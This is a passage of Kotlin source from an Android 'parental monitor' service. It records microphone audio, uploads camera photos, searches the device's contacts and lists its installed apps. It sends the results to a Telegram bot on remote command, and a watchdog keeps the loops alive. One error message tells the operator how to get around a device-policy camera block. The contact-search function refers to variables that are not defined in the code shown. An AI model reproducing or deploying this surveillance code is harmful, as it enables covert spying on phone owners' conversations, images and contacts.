            android.Manifest.permission.RECORD_AUDIO
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isCameraPolicyError(reason: String?): Boolean {
        if (reason == null) return false
        return reason.contains("CAMERA_DISABLED", ignoreCase = true) ||
            reason.contains("disabled by policy", ignoreCase = true) ||
            reason.contains("Camera error: 3")
    }

    private fun isCameraDisabledByPolicy(): Boolean {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            try {
                if (dpm.getCameraDisabled(null)) return true
            } catch (_: Exception) {
            }
            try {
                val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                if (dpm.getCameraDisabled(admin)) return true
            } catch (_: Exception) {
            }
        } catch (_: Exception) {
            return false
        }
        return false
    }

    private fun cameraFailureHint(reason: String?): String {
        if (!hasCameraPermission()) return "Open Setup and grant Camera permission."
        if (isCameraPolicyError(reason) || isCameraDisabledByPolicy()) return "Camera is blocked by device policy (another admin app, work profile, or parental control disabled it). Check Settings > Security > Device admin apps, remove the camera restriction, or pause photos with /pause."
        return "The camera may be in use by another app."
    }

    private fun pendingPhotoCount(): Int {
        return try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.size ?: 0
        } catch (_: Exception) {
            0
        }
    }

    @Volatile
    private var lastLoopRestartAt = 0L

    private fun restartAllLoops(fromWatchdog: Boolean = false) {
        val nowRestart = android.os.SystemClock.elapsedRealtime()
        if (!fromWatchdog && nowRestart - lastLoopRestartAt < 10_000L) return
        lastLoopRestartAt = nowRestart
        try {
            monitoringJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            commandJob?.cancel()
        } catch (_: Exception) {
        }
        idlePolls = 0
        refreshCreds()
        refreshLoopConfig()
        startPeriodicLoops()
        startCommandPolling()
        try {
            val syncActive = initialSyncJob?.isActive == true
            try {
                initialSyncJob?.cancel()
            } catch (_: Exception) {
            }
            if (!syncActive) initialSyncRunning.set(false)
            if (!preferencesManager.initialSyncDone && !initialSyncRunning.get()) {
                initialSyncRunning.set(true)
                initialSyncJob = serviceScope.launch {
                    try {
                        sendInitialData()
                    } catch (_: Exception) {
                    } finally {
                        initialSyncRunning.set(false)
                    }
                }
            }
        } catch (_: Exception) {
        }
    }
    private fun startLoopWatchdog() {
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        loopWatchdogJob = serviceScope.launch {
            while (isActive && loopWatchdogJob === coroutineContext[Job]) {
                try {
                    delay(300_000L)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                    continue
                }
                try {
                    val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
                    if (monitoringJob?.isActive != true || cameraJob?.isActive != true || commandJob?.isActive != true || initialStuck) {
                        android.util.Log.w("MonitoringService", "Loop watchdog: restarting dead loops")
                        if (initialStuck) initialSyncRunning.set(false)
                        restartAllLoops(fromWatchdog = true)
                        val now = android.os.SystemClock.elapsedRealtime()
                        if (now - loopWatchdogNoticeAt > 3_600_000L) {
                            loopWatchdogNoticeAt = now
                            sendToTelegram("\u267B\uFE0F Watchdog restarted dead loops.")
                        }
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Loop watchdog error: ${redactToken(e.message)}")
                } catch (t: Throwable) {
                    android.util.Log.e("MonitoringService", "Fatal watchdog error, watchdog survives")
                }
            }
        }
    }

    private suspend fun ringDevice(seconds: Int) {
        val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
        val stream = android.media.AudioManager.STREAM_ALARM
        val previous = try {
            audioManager.getStreamVolume(stream)
        } catch (_: Exception) {
            -1
        }
        preferencesManager.ringPrevVolume = previous
        preferencesManager.ringSavedAt = System.currentTimeMillis()
        var ringtone: android.media.Ringtone? = null
        try {
            try {
                audioManager.setStreamVolume(stream, audioManager.getStreamMaxVolume(stream), 0)
            } catch (_: Exception) {
            }
            val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM)
            ringtone = android.media.RingtoneManager.getRingtone(applicationContext, uri)
            if (ringtone == null) {
                sendToTelegram("⚠️ Ring failed (no alarm sound).")
                return
            }
            try {
                ringtone?.streamType = stream
            } catch (_: Exception) {
            }
            ringtone?.play()
            sendToTelegram("\uD83D\uDD14 Ringing for $seconds s\u2026")
            val ringEndAt = android.os.SystemClock.elapsedRealtime() + seconds * 1000L
            while (android.os.SystemClock.elapsedRealtime() < ringEndAt) {
                currentCoroutineContext().ensureActive()
                try {
                    if (ringtone?.isPlaying == false) ringtone?.play()
                } catch (_: Exception) {
                }
                kotlinx.coroutines.delay(1000L)
            }
            sendToTelegram("\uD83D\uDD14 Ring finished.")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F Ring failed.")
        } finally {
            try {
                ringtone?.stop()
            } catch (_: Exception) {
            }
            try {
                if (previous >= 0) audioManager.setStreamVolume(stream, previous, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
            preferencesManager.ringSavedAt = 0L
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun recordAndSendAudio(seconds: Int) {
        ensureForegroundTypes()
        val audioFile = File(cacheDir, "audio_" + System.currentTimeMillis() + ".m4a")
        var recorder: android.media.MediaRecorder? = null
        var keepForRetry = false
        var audioOutcome: MediaSendOutcome? = null
        activeAudioFile = audioFile
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(audioFile.absolutePath)
            recorder.prepare()
            recorder.start()
            kotlinx.coroutines.delay(seconds * 1000L)
            try {
                recorder.stop()
            } catch (_: Exception) {
            }
            if (!audioFile.exists() || audioFile.length() == 0L) {
                try {
                    deleteQuietly(audioFile)
                } catch (_: Exception) {
                }
                sendToTelegram("Record failed (empty audio). Please try again.")
                return
            }
            audioOutcome = sendAudioFile(audioFile)
            when (audioOutcome) {
                MediaSendOutcome.SENT -> {
                    sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
                    flushPendingAudio()
                }
                MediaSendOutcome.DROPPED -> {
                    keepForRetry = false
                    try {
                        flushPendingAudio()
                    } catch (_: Exception) {
                    }
                    sendToTelegram("\u26A0\uFE0F Audio rejected by Telegram (400), file discarded.")
                }
                MediaSendOutcome.KEPT -> {
                    keepForRetry = true
                    try {
                        flushPendingAudio()
                    } catch (_: Exception) {
                    }
                    sendToTelegram("\u26A0\uFE0F Audio recorded but send failed. File kept for automatic retry.")
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            if (audioOutcome == MediaSendOutcome.SENT) {
                try {
                    messageQueue.addMessage("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
                    MessageScheduler.scheduleMessageSend(this)
                } catch (_: Exception) {
                }
            } else {
                try { deleteQuietly(audioFile) } catch (_: Exception) { }
            }
            throw e
        } catch (e: SecurityException) {
            try { deleteQuietly(audioFile) } catch (_: Exception) { }
            sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
        } catch (e: Exception) {
            try { deleteQuietly(audioFile) } catch (_: Exception) { }
            sendToTelegram("\u26A0\uFE0F Record failed.")
        } finally {
            try {
                recorder?.release()
            } catch (_: Exception) {
            }
            activeAudioFile = null
            if (!keepForRetry) {
                try { if (audioFile.exists() && audioFile.length() == 0L) deleteQuietly(audioFile) } catch (_: Exception) { }
            }
            pruneAudioCache(MAX_AUDIO_KEPT)
        }
    }

    private suspend fun sendAudioFile(audioFile: File): MediaSendOutcome {
        try {
            if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
            if (!hasNetwork()) return MediaSendOutcome.KEPT
            val (botToken, chatId) = sendCreds()
            if (botToken.isEmpty() || chatId.isEmpty()) return MediaSendOutcome.KEPT
            val requestFile = audioFile.asRequestBody("audio/mp4".toMediaTypeOrNull())
            val audioPart = MultipartBody.Part.createFormData("audio", audioFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
            val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
            val url = "https://api.telegram.org/bot$botToken/sendAudio"
            val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart)
            if (response.isSuccessful && response.body()?.ok == true) {
                deleteQuietly(audioFile)
                return MediaSendOutcome.SENT
            }
            if (response.code() == 401 || response.code() == 403) {
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                } catch (_: Exception) {
                }
            } else if (response.code() == 400) {
                val audioErr = try {
                    response.errorBody()?.string()
                } catch (_: Exception) {
                    null
                }
                if (NetworkUtils.isChatMissing(audioErr)) {
                    try {
                        preferencesManager.credentialError = response.code().toString()
                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
                    } catch (_: Exception) {
                    }
                    return MediaSendOutcome.KEPT
                }
                android.util.Log.w("MonitoringService", "Audio rejected (400), dropping file")
                deleteQuietly(audioFile)
                return MediaSendOutcome.DROPPED
            }
            return MediaSendOutcome.KEPT
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            return MediaSendOutcome.KEPT
        }
    }

    private suspend fun flushPendingAudio(max: Int = 5) {
        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
        if (!audioFlushBusy.compareAndSet(false, true)) return
        try {
            if (!hasNetwork()) return
            val pending = try {
                cacheDir.listFiles { file ->
                    file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
                }?.sortedBy { it.lastModified() }?.take(max) ?: return
            } catch (e: Exception) {
                return
            }
            val now = System.currentTimeMillis()
            for (file in pending) {
                if (file == activeAudioFile) continue
                if (now - file.lastModified() < 10_000L) continue
                if (sendAudioFile(file) == MediaSendOutcome.KEPT) break
                kotlinx.coroutines.delay(500)
            }
        } finally {
            audioFlushBusy.set(false)
            pruneAudioCache(MAX_AUDIO_KEPT)
        }
    }

    private fun pruneAudioCache(maxKept: Int) {
        try {
            val files = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
            }?.sortedBy { it.lastModified() }?.filter { it != activeAudioFile } ?: return
            val dropped = files.dropLast(maxKept)
            if (dropped.isEmpty()) return
            dropped.forEach { deleteQuietly(it) }
            try {
                messageQueue.addMessage("\u26A0\uFE0F ${dropped.size} audio file(s) dropped (cache full).")
                MessageScheduler.scheduleMessageSend(this)
            } catch (_: Exception) {
            }
        } catch (_: Exception) {
        }
    }

    private fun searchContacts(query: String): List<Pair<String, String>> {
        val out = mutableListOf<Pair<String, String>>()
        try {
            val cursor = try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    val bundle = android.os.Bundle().apply {
                        putString(android.content.ContentResolver.QUERY_ARG_SQL_SELECTION, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\'")
                        putStringArray(android.content.ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, arrayOf("%$escaped%"))
                        putString(android.content.ContentResolver.QUERY_ARG_SQL_SORT_ORDER, android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
                        putInt(android.content.ContentResolver.QUERY_ARG_LIMIT, 10)
                    }
                    contentResolver.query(uri, projection, bundle, null)
                } else {
                    contentResolver.query(
                        uri,
                        projection,
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\'",
                        arrayOf("%$escaped%"),
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    )
                }
            } catch (_: Exception) {
                try {
                    contentResolver.query(
                        uri,
                        projection,
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ? ESCAPE '\\'",
                        arrayOf("%$escaped%"),
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                    )
                } catch (_: Exception) {
                    null
                }
            }
            cursor?.use { c ->
                val nameIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                if (nameIdx >= 0 && numIdx >= 0) {
                    while (c.moveToNext() && out.size < 10) {
                        try {
                            out.add((c.getString(nameIdx) ?: "") to (c.getString(numIdx) ?: ""))
                        } catch (_: Exception) {
                        }
                    }
                }
            }
        } catch (_: Exception) {
        }
        return out
    }

    private fun listLaunchableApps(limit: Int): List<String> {
        return try {
            val intent = android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_LAUNCHER)
            val infos = if (android.os.Build.VERSION.SDK_INT >= 33) {
                packageManager.queryIntentActivities(intent, android.content.pm.PackageManager.ResolveInfoFlags.of(0))
            } else {
                packageManager.queryIntentActivities(intent, 0)
            }
            infos.mapNotNull { r ->
                try {
                    val label = r.loadLabel(packageManager)?.toString() ?: return@mapNotNull null
                    val pkg = try {
                        r.activityInfo?.packageName
                    } catch (_: Exception) {
                        null
                    } ?: return@mapNotNull null
                    label to pkg
                } catch (_: Exception) {
                    null
                }
            }.distinctBy { it.second }.sortedBy { it.first.lowercase(java.util.Locale.ROOT) }.take(limit).map { it.first }
        } catch (_: Exception) {
            emptyList()
        }
    }

    private fun cacheStats(): Pair<Long, Int> {
        var bytes = 0L
        var photos = 0
        try {
            for (file in cacheDir.walkTopDown()) {
                try {
                    if (file.isFile) {
                        bytes += file.length()
                        if (file.parent == cacheDir.absolutePath && file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
                    }
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
        return bytes to photos
    }

    private fun formatBytes(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return String.format(java.util.Locale.US, "%.1f KB", kb)
        val mb = kb / 1024.0
        if (mb < 1024) return String.format(java.util.Locale.US, "%.1f MB", mb)
        return String.format(java.util.Locale.US, "%.2f GB", mb / 1024.0)
    }

    private suspend fun sendPhotoFile(photoFile: File): MediaSendOutcome {
        try {
            if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
            if (!hasNetwork()) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return MediaSendOutcome.KEPT
            }

            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                return MediaSendOutcome.KEPT
            }

            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())

            val timestamp = TimeFmt.full(System.currentTimeMillis())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())

            val url = "https://api.telegram.org/bot$botToken/sendPhoto"

            val response = TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                deleteQuietly(photoFile)
                return MediaSendOutcome.SENT
            }
            val errorBody = try {
                response.errorBody()?.string()?.take(200) ?: ""
            } catch (e: Exception) {
                ""
            }
            if (response.code() == 429) {
                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
            } else if (response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), keeping file for retry")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                } catch (_: Exception) {
                }
            } else if (response.code() == 400) {
                if (NetworkUtils.isChatMissing(errorBody)) {
                    try {
                        preferencesManager.credentialError = response.code().toString()
                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
                    } catch (_: Exception) {
                    }
                    return MediaSendOutcome.KEPT
                }
                android.util.Log.w("MonitoringService", "Photo rejected (400), dropping file")
                deleteQuietly(photoFile)
                return MediaSendOutcome.DROPPED
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
            }
            return MediaSendOutcome.KEPT
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram: ${redactToken(e.message)}")
            return MediaSendOutcome.KEPT
        }
    }

    private suspend fun flushPendingPhotos(max: Int = 10) {
        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
        if (!photoFlushBusy.compareAndSet(false, true)) return
        try {
            val pending = try {
                cacheDir.listFiles { file ->
                    file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
                }?.sortedBy { it.lastModified() }?.take(max) ?: return
            } catch (e: Exception) {
                return
            }
            val now = System.currentTimeMillis()
            for (file in pending) {
                if (file == activePhotoFile) continue
                if (now - file.lastModified() < 10_000L) continue
                if (sendPhotoFile(file) == MediaSendOutcome.KEPT) break
                kotlinx.coroutines.delay(500)
            }
            prunePhotoCache()
        } finally {
            photoFlushBusy.set(false)
        }
    }

    private fun deleteQuietly(file: File) {
        try {
            file.delete()
        } catch (_: Exception) {
        }
    }
    private fun prunePhotoCache(maxKept: Int = 10) {
        try {
            try {
                cacheDir.listFiles { file ->
                    file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".tmp") && System.currentTimeMillis() - file.lastModified() > 3_600_000L
                }?.forEach { deleteQuietly(it) }
            } catch (_: Exception) {
            }
            val photos = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile } ?: return
            val dropped = photos.dropLast(maxKept)
            if (dropped.isEmpty()) return
            dropped.forEach { deleteQuietly(it) }
            try {
                messageQueue.addMessage("\u26A0\uFE0F ${dropped.size} photo file(s) dropped (cache full).")
                MessageScheduler.scheduleMessageSend(this)
            } catch (_: Exception) {
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error pruning photo cache: ${redactToken(e.message)}")
        }
    }
}
